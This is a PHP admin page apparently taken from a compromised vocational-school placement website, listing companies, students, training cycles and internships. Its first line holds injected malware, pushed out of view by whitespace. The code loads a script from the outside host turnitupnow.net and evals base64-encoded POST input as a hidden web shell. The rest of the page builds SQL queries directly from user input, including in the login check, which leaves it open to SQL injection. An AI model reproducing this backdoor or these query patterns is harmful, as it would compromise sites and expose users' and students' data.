<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
	//include_once("../system/auth.php");
		include_once("../bdd.php");
		error_reporting(E_ALL);
		ini_set('display_errors', '0');
		include_once("../system/borrar.php");
		session_start(); 	?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Cotes Baixes</title>
<link href="../resources/estilos.css" rel="stylesheet" type="text/css" />
</head>
<script language="JavaScript">
function Abrir_ventana (pagina) {
var opciones="toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, width=500, height=300, top=85, left=140";
window.open(pagina,"",opciones);
}
</script>
<script language="javascript"> function confirmar ( mensaje ) { return confirm( mensaje ); } </script>

<?php 
	if (isset($_GET['off'])) {
	
	session_destroy();
	
	}

	if (isset($_GET['obs'])) { 
	
		$idobs = $_GET['obs'];
		$obs = $_POST['obs'];
		
		$result = $db->Execute("UPDATE CDL_completa SET notas = '$obs' WHERE id = $idobs");
	
	}
	 if (isset($_GET['desc'])) { 
	
		$iddesc = $_GET['desc'];
		$desc = $_POST['desc'];
		
		$result = $db->Execute("UPDATE CDM_caract SET des = '$desc' WHERE id = $iddesc");
		//if ($result === false) die("failed");
	
	}
?>

<body>
<?php if (isset($_GET['login'])) {

	$nombre = $_POST['nombre'];
	$pass = $_POST['pass'];
	
	$result = $db->Execute("SELECT * FROM usuarios WHERE nombre = '$nombre' AND pass = '$pass'");
	if ($result === false) die("failed"); 
		
		while (!$result->EOF) {
			for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
				$lvl = $result->fields[3];
			$result->MoveNext();
		}
		if ($max >= 1) { 
		
			session_start(); 
			$_SESSION["autentificado"]=$lvl;
			$SMS = "Te has identificado correctamente, bienvenido ".$nombre;
		
		} else { $SMS = "Lo sentimos, los datos facilitados no son correctos ".$nombre; }
} ?>
<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td width="295">&nbsp;</td>
    <td width="7" background="../resources/linea.PNG">&nbsp;</td>
    <td width="478" class="texte_normal"><?php echo $SMS ?></td>
    <td width="200" align="right" class="texte_normal"><?php if (isset($_SESSION["autentificado"])) { ?>
      <a href="index.php?off" class="texte_normal">Cerrar Sesión</a>&nbsp;&nbsp; 
          <?php } ?></td>
  </tr>
</table>
<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="295"><img src="../resources/logo.PNG" width="295" height="70" /></td>
        <td width="7" background="../resources/linea.PNG">&nbsp;</td>
        <td width="678"><table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td height="14"></td>
            <td></td>
          </tr>
          <tr>
            <td width="32"><img src="../resources/ico1.png" width="32" height="32" /></td>
            <td class="texte_normal">&nbsp;&nbsp;<a href="index.php?menu=3" class="texte_normal">Acceder a Empresas</a></td>
          </tr>
        </table></td>
  </tr>
</table>
	
    <?php 
		  $menu=$_GET['menu'];
		  
		   switch ($menu) { 
		   
			 case 1: if (!isset($_SESSION["autentificado"])) { include ("login.php"); } else {} break; 
				
			 case 2:  if (!isset($_SESSION["autentificado"])) { include ("login.php"); } else {} break; 
				
			 case 3:  if (!isset($_SESSION["autentificado"])) { include ("login.php"); } else { ?>
             
				<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td width="295" valign="top">
                <?php if (isset($_GET['edit']) && (($_SESSION["autentificado"] == 1) || ($_SESSION["autentificado"] == 3))) { include ("edit.php"); } ?>
				<?php if ($_SESSION["autentificado"] == 1) { 
				
				if ($sub==1) { include ("n_empresa.php"); }
				if ($sub==2) { include ("n_alumno.php"); }
				if ($sub==3) { include ("n_ciclo.php"); }
				if ($sub==4) { include ("n_fct.php"); }
				if ($sub==5) { include ("n_demanda.php"); }
				
				 } ?></td>
				<td width="7" background="../resources/linea.PNG">&nbsp;</td>
				<td width="678" valign="top"><table width="660" border="0" align="center" cellpadding="0" cellspacing="1">
                  <tr>
                    <td width="20%" height="24" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=3&amp;sub=1" class="texte_normal_blanco">Empresas </a></td>
                    <td width="20%" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=3&amp;sub=2" class="texte_normal_blanco">Consultar Alumnos</a></td>
                    <td width="20%" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=3&amp;sub=3" class="texte_normal_blanco">Ciclos Formativos</a></td>
                    <td width="20%" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=3&amp;sub=4" class="texte_normal_blanco">FCT</a></td>
                    <td width="20%" align="center" bgcolor="#000000" class="texte_normal_blanco"><a href="index.php?menu=3&amp;sub=5" class="texte_normal_blanco">Demandes</a></td>
                  </tr>
                </table>
				  <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td height="6"></td>
                    </tr>
                  </table>
				<?php $sub = $_GET['sub'];
				switch ($sub) { 
					
					
				
				//Consultar empresas
		   		case 1:
				?>
				
                <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Consultar Empresas</td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco"><form id="form5" name="form5" method="post" action="index.php?menu=3&sub=<?php echo $sub ?>&search" style="margin:0px">
				  <table width="660" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td width="85" height="26" class="texte_normal">&nbsp;Buscar por</td>
                      <td width="160" align="center"><label>
                        <select name="campo" class="texte_normal" id="campo">
                          <option value="nombre" selected="selected">Nombre</option>
                          <option value="gerente">Gerente</option>
                          <option value="poblacion">Poblacion</option>
                          <option value="cif">CIF/NIF</option>
                          <option value="convenio">Nº Convenio</option>
                      </select>
                      </label></td>
                      <td width="280" align="center"><label>
                        <input name="valor" type="text" class="texte_normal" id="valor" size="40" />
                      </label></td>
                      <td width="115" align="center"><label>
                      <input type="image" src="../resources/bt_buscar.png" name="button5" id="button5" value="Enviar" />
                      </label></td>
                    </tr>
    </table>
                                </form>				</td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
				<table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Resultados de la Consulta</td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="20" bgcolor="#454545" class="texte_normal_blanco"><table width="660" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td width="120" align="center" class="texte_mini_b">Empresa</td>
                          <td width="90" align="center" class="texte_mini_b">Gerente</td>
                          <td width="110" align="center" class="texte_mini_b">Dirección</td>
                          <td width="70" align="center" class="texte_mini_b">Poblacion</td>
                          <td width="70" align="center" class="texte_mini_b">Telf</td>
                          <td width="90" align="center" class="texte_mini_b">Email</td>
                          <td width="35" align="center" class="texte_mini_b">&nbsp;</td>
                          <td width="55">&nbsp;</td>
                        </tr>
                    </table></td>
                  </tr>
                </table>
                <div id="scroll">
				<?php //
				if (isset($_GET['search'])) {
				
					$campo = $_POST['campo'];
					$valor = $_POST['valor'];
				
					$result = $db->Execute("SELECT * FROM CDE_empresas WHERE ".$campo." LIKE '%".$valor."%' ORDER BY id DESC");
				
				} else { 
				
					$result = $db->Execute("SELECT * FROM CDE_empresas ORDER BY id DESC");
							
				} 
				if ($result === false) die("failed");
                
					while (!$result->EOF) {
					
					for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
					
					$id = $result->fields[0];
					$nombre = $result->fields[1];
					$convenio = $result->fields[2];
					$gerente = $result->fields[3];
					$direccion = $result->fields[4];
					$cp = $result->fields[5];
					$poblacion = $result->fields[6];
					$telf1 = $result->fields[10];
					$email1 = $result->fields[11];
				?>
                
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" align="center" bgcolor="#F7F7F7" class="texte_normal_blanco"><table width="640" border="0" cellpadding="0" cellspacing="0" class="texte_mini">
                  <tr>
                    <td width="120" align="center" class="texte_mini"><?php echo utf8_encode($nombre) ?></td>
                    <td width="90" align="center" class="texte_mini"><?php echo utf8_encode($gerente) ?></td>
                    <td width="110" align="center" class="texte_mini"><?php echo utf8_encode($cp." - ".$direccion) ?></td>
                    <td width="70" align="center" class="texte_mini"><?php echo utf8_encode($poblacion) ?></td>
                    <td width="70" align="center" class="texte_mini"><?php echo utf8_encode($telf1) ?></td>
                    <td width="90" align="center" class="texte_mini"><?php echo utf8_encode($email1) ?></td>
                    <td width="34" align="center" class="texte_mini"><a href="javascript:Abrir_ventana('ficha_empresa.php?id=<?php echo $id ?>')" class="texte_mini">info</a></td>
                    <td width="28" align="center">
                    <?php if ($_SESSION["autentificado"] <= 3) { ?>
                              <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&edit=<?php echo $id ?>"><img src="../resources/ico_m_editar.png" width="16" height="16" border="0" /></a>
                   	<?php } ?>                    </td>
                    <td width="28" align="center">
                    <?php if ($_SESSION["autentificado"] == 1) { ?>
                              <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&borrar=<?php echo $id ?>&tabla=CDE_empresas" onclick="return confirmar('Se borrara definitivamente')"><img src="../resources/ico_m_del.png" width="16" height="16" border="0" /></a>
                    <?php } ?>                    </td>
                  </tr>
                </table></td>
				</tr>
				</table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="6"></td>
				</tr>
				</table>
                
				<?php
				$result->MoveNext();
					}?>
				</div>
				<?php
				break; 
				
				
				//Consultar alumnos
		   		case 2:
				?>
                <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Consultar Alumnos</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
              <td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco"><form id="form6" name="form5" method="post" action="index.php?menu=3&amp;sub=<?php echo $sub ?>&amp;search" style="margin:0px">
                        <table width="660" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td width="85" height="26" class="texte_normal">&nbsp;Buscar por</td>
                            <td width="160" align="center"><label>
                              <select name="campo" class="texte_normal" id="campo">
                                <option value="alumne" selected="selected">Nombre</option>
                                <option value="alumne">Apellido</option>
                                <option value="dni">DNI</option>
                              </select>
                            </label></td>
                            <td width="280" align="center"><label>
                              <input name="valor" type="text" class="texte_normal" id="valor" size="40" />
                            </label></td>
                            <td width="115" align="center"><label>
                              <input type="image" src="../resources/bt_buscar.png" name="button6" id="button6" value="Enviar" />
                            </label></td>
                          </tr>
                        </table>
                    </form></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Resultados de la Consulta</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="20" bgcolor="#454545" class="texte_normal_blanco"><table width="660" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td width="130" align="center" class="texte_mini_b">Nombre</td>
                          <td width="80" align="center" class="texte_mini_b">DNI</td>
                          <td width="85" align="center" class="texte_mini_b">F. Nacimiento</td>
                          <td width="80" align="center" class="texte_mini_b">Telf</td>
                          <td width="80" align="center" class="texte_mini_b">Movil</td>
                          <td width="100" align="center" class="texte_mini_b">Email</td>
                          <td width="30" align="center" class="texte_mini_b">&nbsp;</td>
                          <td width="55">&nbsp;</td>
                        </tr>
                    </table></td>
                  </tr>
                </table>
                <div id="scroll">
                <?php //
				if (isset($_GET['search'])) {
				
					$campo = $_POST['campo'];
					$valor = $_POST['valor'];
				
					$result = $db->Execute("SELECT * FROM CDE_alumnos WHERE ".$campo." LIKE '%".$valor."%' ORDER BY id DESC");
				
				} else { 
				
					$result = $db->Execute("SELECT * FROM CDE_alumnos ORDER BY id DESC");
							
				} 
				if ($result === false) die("failed");
                
					while (!$result->EOF) {
					
					for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
					
					$id = $result->fields[0];
					$nombre = $result->fields[1];
					$dni = $result->fields[2];
					$nacimiento = $result->fields[3];
					$telf = $result->fields[8];
					$movil = $result->fields[9];
					$email = $result->fields[10];
				
				?>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" align="center" bgcolor="#F7F7F7" class="texte_normal_blanco"><table width="640" border="0" cellpadding="0" cellspacing="0" class="texte_mini">
                        <tr>
                          <td width="130" align="center" class="texte_mini"><?php echo utf8_encode($nombre) ?></td>
                          <td width="80" align="center" class="texte_mini"><?php echo utf8_encode($dni) ?></td>
                          <td width="85" align="center" class="texte_mini"><?php echo utf8_encode($nacimiento) ?></td>
                          <td width="80" align="center" class="texte_mini"><?php echo utf8_encode($telf) ?></td>
                          <td width="80" align="center" class="texte_mini"><?php echo utf8_encode($movil) ?></td>
                          <td width="100" align="center" class="texte_mini"><?php echo utf8_encode($email) ?></td>
                          <td width="29" align="center" class="texte_mini"><a href="javascript:Abrir_ventana('../ficha_alumno.php?id=<?php echo $id ?>')" class="texte_mini">info</a></td>
                    <td width="28" align="center"><?php if ($_SESSION["autentificado"] <= 3) { ?>
                      <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;edit=<?php echo $id ?>"><img src="../resources/ico_m_editar.png" width="16" height="16" border="0" /></a>
                          <?php } ?>                          </td>
                        <td width="28" align="center"><?php if ($_SESSION["autentificado"] == 1) { ?>
                          <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;borrar=<?php echo $id ?>&amp;tabla=CDE_alumnos" onclick="return confirmar('Se borrara definitivamente')"><img src="../resources/ico_m_del.png" width="16" height="16" border="0" /></a>
                          <?php } ?>                          </td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table><?php
				
                $result->MoveNext();
					} ?>
			</div>
            	<?php
					break; 
					
					
					//Consultar ciclos
					case 3:
                ?>
                <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Consultar Ciclos</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
              <td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco"><form id="form7" name="form5" method="post" action="index.php?menu=3&amp;sub=<?php echo $sub ?>&amp;search" style="margin:0px">
                        <table width="660" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td width="85" height="26" class="texte_normal">&nbsp;Buscar por</td>
                            <td width="160" align="center"><label>
                              <select name="campo" class="texte_normal" id="campo">
                                <option value="cicle" selected="selected">Nombre</option>
                                <option value="codi">Codigo</option>
                              </select>
                            </label></td>
                            <td width="280" align="center"><label>
                              <input name="valor" type="text" class="texte_normal" id="valor" size="40" />
                            </label></td>
                            <td width="115" align="center"><label>
                              <input type="image" src="../resources/bt_buscar.png" name="button7" id="button7" value="Enviar" />
                            </label></td>
                          </tr>
                        </table>
                    </form></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Resultados de la Consulta</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="20" bgcolor="#454545" class="texte_normal_blanco"><table width="660" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td width="250" align="center" class="texte_mini_b">Ciclo</td>
                          <td width="64" align="center" class="texte_mini_b">Codigo</td>
                          <td width="65" align="center" class="texte_mini_b">Duración</td>
                          <td width="176" align="center" class="texte_mini_b">Familia</td>
                          <td width="30" align="center" class="texte_mini_b">&nbsp;</td>
                          <td width="55">&nbsp;</td>
                        </tr>
                    </table></td>
                  </tr>
                </table>
                  <div id="scroll">
                <?php //
				if (isset($_GET['search'])) {
				
					$campo = $_POST['campo'];
					$valor = $_POST['valor'];
				
					//$result = $db->Execute("SELECT * FROM CDE_cicleform WHERE ".$campo." LIKE '%".$valor."%' ORDER BY id DESC");
					$result = $db->Execute("SELECT CDE_cicleform.id, CDE_cicleform.cicle, CDE_cicleform.codi, CDE_cicleform.duracio, CDE_famciclos.familia FROM CDE_cicleform, CDE_famciclos WHERE (CDE_cicleform.".$campo." LIKE '%".$valor."%') AND (CDE_cicleform.idf = CDE_famciclos.id) ORDER BY CDE_famciclos.id DESC");
				
				} else { 
				
					$result = $db->Execute("SELECT CDE_cicleform.id, CDE_cicleform.cicle, CDE_cicleform.codi, CDE_cicleform.duracio, CDE_famciclos.familia FROM CDE_cicleform, CDE_famciclos WHERE CDE_cicleform.idf = CDE_famciclos.id ORDER BY CDE_famciclos.id");
							
				} 
				if ($result === false) die("failed_consulta");
                
					while (!$result->EOF) {
					
					for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
					
					$id = $result->fields[0];
					$ciclo = $result->fields[1];
					$codigo = $result->fields[2];
					$duracion = $result->fields[3];
					$familia = $result->fields[4];
				
				?>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" align="center" bgcolor="#F7F7F7" class="texte_normal_blanco"><table width="640" border="0" cellpadding="0" cellspacing="0" class="texte_mini">
                        <tr>
                          <td width="250" align="center" class="texte_mini"><?php echo utf8_encode($ciclo) ?></td>
                          <td width="65" align="center" class="texte_mini"><?php echo utf8_encode($codigo) ?></td>
                          <td width="65" align="center" class="texte_mini"><?php echo utf8_encode($duracion) ?></td>
                          <td width="175" align="center" class="texte_mini"><?php echo utf8_encode($familia) ?></td>
                          <td width="29" align="center" class="texte_mini">&nbsp;</td>
                          <td width="28" align="center"><?php if ($_SESSION["autentificado"] <= 3) { ?>
                            <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;edit=<?php echo $id ?>"><img src="../resources/ico_m_editar.png" width="16" height="16" border="0" /></a>
                              <?php } ?>                          </td>
                        <td width="28" align="center"><?php if ($_SESSION["autentificado"] == 1) { ?>
                          <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;borrar=<?php echo $id ?>&amp;tabla=CDE_cicleform" onclick="return confirmar('Se borrara definitivamente')"><img src="../resources/ico_m_del.png" width="16" height="16" border="0" /></a>
                          <?php } ?>                          </td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <?php $result->MoveNext();
				} ?>
                </div>
                <?php 
                break; 
				
                
                
                //Consultar FCT
                case 4:
				?>
                <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Consultar FCT</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
              <td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco"><form id="form6" name="form5" method="post" action="index.php?menu=3&amp;sub=<?php echo $sub ?>&amp;search" style="margin:0px">
                        <table width="660" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td width="85" height="26" class="texte_normal">&nbsp;Buscar por</td>
                            <td width="160" align="center"><label>
                              <select name="campo" class="texte_normal" id="campo">
                                <option value="empresa">Empresas</option>
                                <option value="alumne">Alumnos</option>
                                <option value="cicle">Ciclo Formativo</option>
                              </select>
                            </label></td>
                            <td width="280" align="center"><label>
                              <input name="valor" type="text" class="texte_normal" id="valor" size="40" />
                            </label></td>
                            <td width="115" align="center"><label>
                              <input type="image" src="../resources/bt_buscar.png" name="button6" id="button6" value="Enviar" />
                            </label></td>
                          </tr>
                        </table>
                    </form></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Resultados de la Consulta</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="20" bgcolor="#454545" class="texte_normal_blanco"><table width="660" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td width="128" align="center" class="texte_mini_b">Empresa</td>
                          <td width="128" align="center" class="texte_mini_b">Alumno</td>
                          <td width="130" align="center" class="texte_mini_b">Ciclo</td>
                          <td width="80" align="center" class="texte_mini_b">Curso</td>
                          <td width="80" align="center" class="texte_mini_b">Periodo</td>
                          <td width="30" align="center" class="texte_mini_b">Ev</td>
                          <td width="64">&nbsp;</td>
                        </tr>
                    </table></td>
                  </tr>
                </table>
                  <div id="scroll">
                <?php // -- Carrega Arrays //
				$a_curso = array();
				$result = $db->Execute("SELECT * FROM CDE_cursos ORDER BY id_curso ASC");
				if ($result === false) die("array_cursos");
				while (!$result->EOF) {
					$a_curso[] = $result->fields[1];
				$result->MoveNext();
				}
				
				
				if (isset($_GET['search'])) {
				
					$campo = $_POST['campo'];
					$valor = $_POST['valor'];
					
						if ($campo=='empresa') { $campo_valor = "CDE_empresas.convenio"; }
						if ($campo=='alumne') { $campo_valor = "CDE_alumnos.alumne"; }
						if ($campo=='cicle') { $campo_valor = "CDE_cicleform.cicle"; }
				
					$result = $db->Execute("SELECT CDE_fct.id, CDE_alumnos.alumne, CDE_empresas.convenio, CDE_cicleform.cicle, CDE_fct.curs, CDE_fct.finicio, CDE_fct.ffin, CDE_fct.evaluacion FROM CDE_fct, CDE_empresas, CDE_cicleform, CDE_alumnos WHERE (CDE_fct.empresa = CDE_empresas.id) AND (CDE_fct.cicle = CDE_cicleform.id) AND (CDE_fct.alumne = CDE_alumnos.id) AND (".$campo_valor." LIKE '%".$valor."%') ORDER BY CDE_fct.id DESC");
				
				} else { 
				
					$result = $db->Execute("SELECT CDE_fct.id, CDE_alumnos.alumne, CDE_empresas.convenio, CDE_cicleform.cicle, CDE_fct.curs, CDE_fct.finicio, CDE_fct.ffin, CDE_fct.evaluacion FROM CDE_fct, CDE_empresas, CDE_cicleform, CDE_alumnos WHERE (CDE_fct.empresa = CDE_empresas.id) AND (CDE_fct.cicle = CDE_cicleform.id) AND (CDE_fct.alumne = CDE_alumnos.id) ORDER BY CDE_fct.id DESC");
					//$result = $db->Execute("SELECT * FROM CDE_fct ORDER BY id DESC");
						
				} 
				if ($result === false) die("failed");
                
					while (!$result->EOF) {
					
					for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
					
					$id = $result->fields[0];
					$alumne = $result->fields[1];
					$empresa = $result->fields[2];
					$cicle = $result->fields[3];
					$curs = $result->fields[4];
					$finicio = $result->fields[5];
					$ffin = $result->fields[6];
					$evaluacion = $result->fields[7];
				
				?>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" align="center" bgcolor="#F7F7F7" class="texte_normal_blanco"><table width="640" border="0" cellpadding="0" cellspacing="0" class="texte_mini">
                        <tr>
                          <td width="128" align="center" class="texte_mini"><?php echo utf8_encode($empresa) ?></td>
                          <td width="128" align="center" class="texte_mini"><?php echo utf8_encode($alumne) ?></td>
                          <td width="130" align="center" class="texte_mini"><?php echo utf8_encode($cicle) ?></td>
                          <td width="80" align="center" class="texte_mini"><?php echo $a_curso[$curs] ?></td>
                          <td width="80" align="center" class="texte_mini"><?php echo utf8_encode($finicio) ?> - <?php echo utf8_encode($ffin) ?></td>
                          <td width="30" align="center" class="texte_mini"><?php echo utf8_encode($evaluacion) ?></td>
                          <td width="32" align="center"><?php if ($_SESSION["autentificado"] <= 3) { ?>
                            <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;edit=<?php echo $id ?>"><img src="../resources/ico_m_editar.png" width="16" height="16" border="0" /></a>
                          <?php } ?>                          </td>
                        <td width="32" align="center"><?php if ($_SESSION["autentificado"] == 1) { ?>
                          <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;borrar=<?php echo $id ?>&amp;tabla=CDE_empresas" onclick="return confirmar('Se borrara definitivamente')"><img src="../resources/ico_m_del.png" width="16" height="16" border="0" /></a>
                              <?php } ?>                          </td>
                        </tr>
                    </table></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table><?php
				
                $result->MoveNext();
					} ?>
                  </div>
				<?php	
					break; 
					
					
					//Consultar demandas
					case 5:
                ?>
                 <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Consultar Demandas</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
              <td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco"><form id="form7" name="form5" method="post" action="index.php?menu=3&amp;sub=<?php echo $sub ?>&amp;search" style="margin:0px">
                        <table width="660" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td width="85" height="26" class="texte_normal">&nbsp;Buscar por</td>
                            <td width="160" align="center"><label>
                              <select name="campo" class="texte_normal" id="campo">
                                <option value="empresa" selected="selected">Empresa</option>
                                <option value="cicle">Ciclo</option>
                                <option value="historico">Historico*</option>
                                <option value="sin">Sin Atender*</option>
                              </select>
                            </label></td>
                            <td width="280" align="center"><label>
                              <input name="valor" type="text" class="texte_normal" id="valor" size="40" />
                            </label></td>
                            <td width="115" align="center"><label>
                              <input type="image" src="../resources/bt_buscar.png" name="button7" id="button7" value="Enviar" />
                            </label></td>
                          </tr>
                        </table>
                    </form></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Resultados de la Consulta</td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="20" bgcolor="#454545" class="texte_normal_blanco"><table width="660" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td width="90" align="center" class="texte_mini_b">Fecha demanda</td>
                          <td width="170" align="center" class="texte_mini_b">Empresa</td>
                          <td width="170" align="center" class="texte_mini_b">Ciclo Solicitado</td>
                          <td width="125" align="center" class="texte_mini_b">Demanda Atendida</td>
